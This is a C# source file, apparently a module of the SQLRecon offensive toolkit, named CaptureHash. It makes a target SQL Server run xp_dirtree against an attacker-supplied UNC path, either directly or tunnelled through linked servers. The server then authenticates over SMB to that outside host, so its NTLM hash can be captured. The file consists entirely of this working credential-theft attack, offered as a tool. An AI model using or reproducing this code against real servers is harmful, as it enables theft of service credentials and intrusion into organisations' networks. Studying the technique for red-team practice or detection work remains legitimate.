using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    internal class CaptureHash
    {
        private static readonly SqlQuery _sqlQuery = new();

        /// <summary>
        /// This constructor will instruct the remote SQL server to solicit
        /// a SMB request to a supplied UNC path.
        /// </summary>
        /// <param name="con">Connection to SQL Server</param>
        /// <param name="smbShare">The user supplied UNC path</param>
        /// <param name="tunnelSqlServers">A list of SQL Servers forming the tunnel path, if specified</param>
        public CaptureHash(SqlConnection con, string smbShare, string[] tunnelSqlServers = null)
        {
            if (tunnelSqlServers != null && tunnelSqlServers.Length > 0)
            {
                // Construct the query to send the SMB request through the tunnel
                string query = $"EXEC master..xp_dirtree '\\\\{smbShare}\\share'";
                string result = _sqlQuery.ExecuteTunnelCustomQuery(con, tunnelSqlServers, query);
            }
            else
            {
                // Directly send the SMB request
                _sqlQuery.ExecuteCustomQuery(con, $"EXEC master..xp_dirtree '\\\\{smbShare}\\share';");
            }
        }
    }
}
